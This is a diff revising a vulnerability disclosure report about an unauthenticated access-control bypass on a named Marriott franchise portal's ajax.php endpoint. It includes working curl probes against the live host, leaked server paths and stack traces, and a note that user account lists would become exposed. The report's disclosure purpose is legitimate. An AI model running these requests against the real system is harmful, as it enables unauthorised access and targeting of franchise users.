@@ -8,13 +8,14 @@
 **Status:** Report-ready  
 **Discovered:** 2026-06-22 (Session 5–6)  
 **Researcher IP used during testing:** `180.148.212.54`  
-**Tools:** curl 7.x  
+**Tools:** curl 8.14.1  
+**Server:** Apache/2.4.65 (Unix) PHP/8.3.29  
 
 ---
 
 ## Summary
 
-The Marriott Owner and Franchise Services portal (`marriottfranchisetransactions.marriott.com`) exposes a PHP dispatcher endpoint at `/ajax.php` that routes requests by `module` and `function` POST parameters. The `user/list` function can be invoked **without any session cookie or authentication token** — the authentication gate is bypassed. Although a secondary PHP 8 type error (`json_decode()` on an array) prevents data from being returned in the current code path, the bypass itself is confirmed by the distinct server response (430 bytes of PHP Fatal Error output versus the 93-byte "not authorized" stub returned for all other functions). The fatal error also discloses the absolute server path `/FranLic/www/html/` and a live database connection object (`MysqliDb`), confirming that financial user data would be accessible if the `json_decode` call were corrected. The vulnerability class is authentication bypass — the fix requires enforcing session validation before dispatching any module function, not only correcting the `json_decode` bug.
+The Marriott Owner and Franchise Services portal (`marriottfranchisetransactions.marriott.com`) exposes a PHP dispatcher endpoint at `/ajax.php` that routes requests by `module` and `function` POST parameters. The `user/list` function can be invoked **without any session cookie or authentication token** — the authentication gate is bypassed. Although a secondary PHP 8 type error (`json_decode()` on an array) prevents data from being returned in the current code path, the bypass itself is confirmed by the distinct server response (431 bytes of PHP Fatal Error output versus the 93-byte "not authorized" stub returned for all other functions). The fatal error also discloses the absolute server path `/FranLic/www/html/` and a live database connection object (`MysqliDb`), confirming that financial user data would be accessible if the `json_decode` call were corrected. The vulnerability class is authentication bypass — the fix requires enforcing session validation before dispatching any module function, not only correcting the `json_decode` bug.
 
 ---
 
@@ -37,7 +38,7 @@ The server returns one of two responses:
 
 ### Authentication bypass in `user/list`
 
-All tested module/function combinations return the 93-byte stub **except** `module=user&function=list`, which returns a distinct 430-byte PHP Fatal Error. This size difference is the smoking gun: the function was dispatched to server code without any session cookie present in the request.
+All tested module/function combinations return the 93-byte stub **except** `module=user&function=list`, which returns a distinct 431-byte PHP Fatal Error. This size difference is the smoking gun: the function was dispatched to server code without any session cookie present in the request.
 
 ### Root cause (confirmed by stack trace)
 
@@ -70,7 +71,7 @@ The stack trace also leaks the full server filesystem path:
 
 ### Session 7: Definitive bug proof (multipart encoding test)
 
-To conclusively identify whether the server calls `json_decode($_POST['data'])` (which would accept a string) versus `json_decode($_POST)` (which passes the entire array), a multipart/form-data request was tested. With multipart encoding, PHP populates `$_POST['data']` as a string value — not as part of the URL-encoded body. If the server called `json_decode($_POST['data'])`, multipart would succeed. Instead, the identical 430-byte Fatal Error was returned:
+To conclusively identify whether the server calls `json_decode($_POST['data'])` (which would accept a string) versus `json_decode($_POST)` (which passes the entire array), a multipart/form-data request was tested. With multipart encoding, PHP populates `$_POST['data']` as a string value — not as part of the URL-encoded body. If the server called `json_decode($_POST['data'])`, multipart would succeed. Instead, the identical 431-byte Fatal Error was returned:
 
 ```bash
 curl -sk -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
@@ -78,20 +79,20 @@ curl -sk -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
   -F "function=list" \
   -F "activekey=NONE" \
   -F 'data={"page":1}' 
-# Returns: 430B PHP Fatal Error (identical to form-encoded test)
+# Returns: 431B PHP Fatal Error (identical to form-encoded test)
 ```
 
 This definitively proves the server code is calling `json_decode($_POST)` — passing the entire PHP superglobal array — rather than `json_decode($_POST['data'])`. No HTTP encoding variation can fix this from the caller side.
 
 ### Session 7: CSRF token validation absent
 
-The `activekey` CSRF token is also not validated. Sending the request with no `activekey` field at all returns the identical 430-byte bypass response:
+The `activekey` CSRF token is also not validated. Sending the request with no `activekey` field at all returns the identical 431-byte bypass response:
 
 ```bash
 curl -sk -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   --data 'module=user&function=list&data={}'
-# Returns: 430B PHP Fatal Error (CSRF token not validated)
+# Returns: 431B PHP Fatal Error (CSRF token not validated)
 ```
 
 This means the `user/list` function is reachable with: (a) no session cookie, (b) no CSRF token, (c) via any content-type encoding including multipart.
@@ -127,8 +128,10 @@ curl -v \
 **Expected result (NO session cookie sent):**
 
 ```
-HTTP/1.1 200 OK
-Content-Length: 430
+HTTP/2 200
+content-type: application/json
+content-length: 431
+server: Apache/2.4.65 (Unix) PHP/8.3.29
 
 <br />
 <b>Fatal error</b>:  Uncaught TypeError: json_decode(): Argument #1 ($json) must be of type string, array given in /FranLic/www/html/lib/internal/request.inc.php:233
@@ -139,39 +142,39 @@ Stack trace:
 thrown in <b>/FranLic/www/html/lib/internal/request.inc.php</b> on line <b>233</b>
 ```
 
-**Contrast (send ANY other module/function — demonstrates the 93B auth wall is active for all others):**
+**Contrast (auth-gated function — demonstrates the 93B auth wall is active for all other user functions):**
 
 ```bash
 curl -s \
   -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
-  --data-urlencode 'module=user_auth' \
-  --data-urlencode 'function=prelogin' \
+  --data-urlencode 'module=user' \
+  --data-urlencode 'function=get' \
   --data-urlencode 'data={}' \
   2>&1
 # Returns: {"html":false,"data":false,"callback":false,"message":false,"status":false,"container":false}
-# (93 bytes — not dispatched / auth wall active)
+# (93 bytes — dispatched blocked / auth wall active)
 ```
 
-The contrast proves that `user/list` specifically bypasses the access control gate.
+The contrast proves that `user/list` specifically bypasses the access control gate that blocks all other `user/*` functions (`user/get`, `user/update`, etc.).
 
 **Step 3 (triager verification):** Confirm response length difference:
 
 ```bash
-# user/list — AUTH BYPASS (should return 430B):
-curl -s -o /dev/null -w "%{size_download}" \
+# user/list — AUTH BYPASS (should return 431B):
+curl -s -o /dev/null -w "%{size_download}B\n" \
   -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
   -d 'module=user&function=list&activekey=test&data={}'
 
-# user_auth/prelogin — protected (should return 93B):
-curl -s -o /dev/null -w "%{size_download}" \
+# user/get — AUTH GATED (should return 93B):
+curl -s -o /dev/null -w "%{size_download}B\n" \
   -X POST 'https://marriottfranchisetransactions.marriott.com/ajax.php' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
-  -d 'module=user_auth&function=prelogin&activekey=test&data={}'
+  -d 'module=user&function=get&activekey=test&data={}'
 ```
 
-Expected output: `430` and `93` respectively.
+Expected output: `431B` and `93B` respectively.
 
 ---
 
@@ -184,7 +187,7 @@ Expected output: `430` and `93` respectively.
 - **Developer attribution:** `Ignition72, Inc.` (found in page source `<meta name="author" content="Ignition72, Inc.">`). This is a custom development shop, not a vendor CMS, which means the bug is a bespoke implementation error.
 
 ### Risk if secondary PHP 8 bug is fixed (or in PHP 7 mode)
-If the `json_decode($_POST)` bug is patched (or the server downgrades to PHP 7 where `json_decode(array)` returns `null` rather than throwing), the `user/list` function would execute successfully and return **a list of franchise portal user accounts** (names, emails, roles) to any unauthenticated attacker. This would be a **High** finding.
+If the `json_decode($_POST)` bug is patched (confirmed PHP/8.3.29 where `json_decode(array)` throws TypeError; in PHP 7 it silently returns `null`), the `user/list` function would execute successfully and return **a list of franchise portal user accounts** (names, emails, roles) to any unauthenticated attacker. This would be a **High** finding.
 
 ### Business context
 This portal handles financial transactions between Marriott corporate and franchise hotel owners. A listing of franchise owner accounts enables targeted phishing, credential stuffing, and social engineering against a high-value subset of Marriott's business partners.
